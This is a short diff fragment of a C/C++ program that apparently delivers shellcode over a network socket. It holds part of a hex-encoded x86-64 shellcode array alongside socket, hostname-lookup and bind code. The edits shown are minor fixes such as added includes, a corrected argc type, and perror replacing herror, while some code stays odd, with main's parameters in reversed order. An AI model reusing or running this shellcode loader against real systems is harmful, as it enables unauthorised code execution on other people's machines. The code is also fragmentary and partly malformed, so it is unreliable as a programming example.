@@ -5,6 +5,8 @@
 #include <stdio.h>
 #include <arpa/inet.h>
 #include <netdb.h>
+#include <cstring>
+#include <cstdlib>
 
 #include "resource/iphdr"
 
@@ -26,7 +28,7 @@ char * sc[] =  "\x48\x31\xc0\x48\x31\xd2\x50\x6a"
 "\x05";
 int sclen = sizeof(sc) -1;
 
-int main(char * argv[], int * argc)  
+int main(char * argv[], int  argc)  
 {
     char p[SIZE];
     // our socket
@@ -74,7 +76,7 @@ int main(char * argv[], int * argc)
 
     if (host == NULL) 
     {
-        herror("gethostbyname");
+        perror("gethostbyname");
         exit(-1);
     }
     else 
@@ -97,7 +99,7 @@ int main(char * argv[], int * argc)
 
     if (set < 0) 
     {
-        herror("bind");
+        perror("bind");
         exit(-1);
     }
 
